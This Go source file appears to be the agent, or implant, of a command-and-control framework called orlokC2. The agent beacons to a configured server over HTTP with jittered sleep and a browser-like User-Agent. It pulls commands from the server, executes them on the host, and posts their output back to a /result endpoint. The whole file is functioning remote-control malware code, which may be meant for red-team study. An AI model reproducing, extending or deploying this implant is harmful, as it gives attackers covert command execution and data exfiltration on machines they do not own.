package agent

import (
	"bytes"
	"encoding/json"
	"fmt"
	"github.com/faanross/orlokC2/internal/agent/commands"
	"github.com/faanross/orlokC2/internal/agent/config"
	"io"
	"log"
	"math/rand"
	"net/http"
	"time"
)

type Agent struct {
	Config *config.Config

	client *http.Client

	stopChan chan struct{}

	running   bool
	connected bool
}

func NewAgent(config *config.Config) *Agent {
	return &Agent{
		Config: config,
		client: &http.Client{
			Timeout: config.RequestTimeout},
		stopChan:  make(chan struct{}),
		running:   false,
		connected: false,
	}
}

func (a *Agent) Start() error {
	if a.running {
		return fmt.Errorf("agent already running")
	}
	a.running = true
	go a.runLoop()

	return nil
}

func (a *Agent) Stop() error {
	if !a.running {
		return fmt.Errorf("agent is already not running")
	}
	close(a.stopChan)
	a.running = false

	fmt.Println("agent stopped")
	return nil
}

func (a *Agent) runLoop() {
	for {
		select {
		case <-a.stopChan:
			return
		default:
			sleepTime := a.CalculateSleepWithJitter()

			// Connect
			err := a.Connect()
			if err != nil {
				log.Printf("Error connecting to agent: %v\n", err)
				time.Sleep(sleepTime)
				continue
			}

			// Send request
			resp, err := a.SendRequest(a.Config.Endpoint)
			if err != nil {
				log.Printf("Error sending request: %v\n", err)
				time.Sleep(sleepTime)
				continue
			}

			// Process response
			if resp.Body != nil {
				defer resp.Body.Close()
			}

			body, err := io.ReadAll(resp.Body)
			if err != nil {
				log.Printf("Error reading response body: %v\n", err)
				continue
			}

			var cmdResp struct {
				Command    string `json:"command"`
				HasCommand bool   `json:"has_command"`
			}

			err = json.Unmarshal(body, &cmdResp)
			if err != nil {
				log.Printf("Error parsing response body: %v\n", err)
				continue
			}

			log.Printf("Command received: hasCommand=%v, Command=%s\n", cmdResp.HasCommand, cmdResp.Command)

			if cmdResp.HasCommand {
				a.executeCommand(cmdResp.Command)
			}

			// Sleep
			time.Sleep(sleepTime)
		}
	}
}

func (a *Agent) Connect() error {
	url := fmt.Sprintf("http://%s/", a.GetTargetAddress())

	req, err := http.NewRequest("HEAD", url, nil)
	if err != nil {
		return fmt.Errorf("Error creating request: %v\n", err)
	}

	resp, err := a.client.Do(req)
	if err != nil {
		return fmt.Errorf("Error connecting to agent: %v\n", err)
	}
	defer resp.Body.Close()

	a.connected = true
	return nil
}

func (a *Agent) GetTargetAddress() string {
	return fmt.Sprintf("%s:%s", a.Config.TargetHost, a.Config.TargetPort)
}

func (a *Agent) SendRequest(endpoint string) (*http.Response, error) {
	if !a.connected {
		return nil, fmt.Errorf("agent not connected")
	}

	url := fmt.Sprintf("http://%s%s", a.GetTargetAddress(), endpoint)

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, fmt.Errorf("Error creating request: %v\n", err)
	}

	req.Header.Set("User-Agent", "Mozilla/5.0")
	req.Header.Set("X-Agent-ID", a.Config.AgentUUID)

	resp, err := a.client.Do(req)
	if err != nil {
		a.connected = false
		return nil, fmt.Errorf("Error connecting to agent: %v\n", err)
	}
	return resp, nil

}

func (a *Agent) CalculateSleepWithJitter() time.Duration {
	jitterFactor := 1.0 + (rand.Float64() * a.Config.Jitter / 100.0)
	return time.Duration(float64(a.Config.Sleep) * jitterFactor)
}

func (a *Agent) executeCommand(command string) {
	log.Printf("Executing command: %s\n", command)

	// execute the command
	output, err := commands.Execute(command)

	if err != nil {
		output = err.Error()
	}

	result := struct {
		Type    string `json:"type"`
		Command string `json:"command"`
		Output  string `json:"output"`
	}{
		Type:    "response",
		Command: command,
		Output:  output,
	}

	resultJSON, err := json.Marshal(result)
	if err != nil {
		log.Printf("Error marshalling json: %v\n", err)
		return
	}

	// Prepare the result to send back AS A REQUEST
	reader := bytes.NewReader(resultJSON)

	req, err := http.NewRequest("POST",
		fmt.Sprintf("http://%s/result", a.GetTargetAddress()), reader)

	if err != nil {
		log.Printf("Error creating request: %v\n", err)
		return
	}

	// Add headers
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-Agent-ID", a.Config.AgentUUID)

	// Send the request
	client := &http.Client{Timeout: a.Config.RequestTimeout}
	resp, err := client.Do(req)
	if err != nil {
		log.Printf("Error sending result: %v\n", err)
		return
	}
	defer resp.Body.Close()

	// Finish up
	log.Println("Command execution complete!")

}
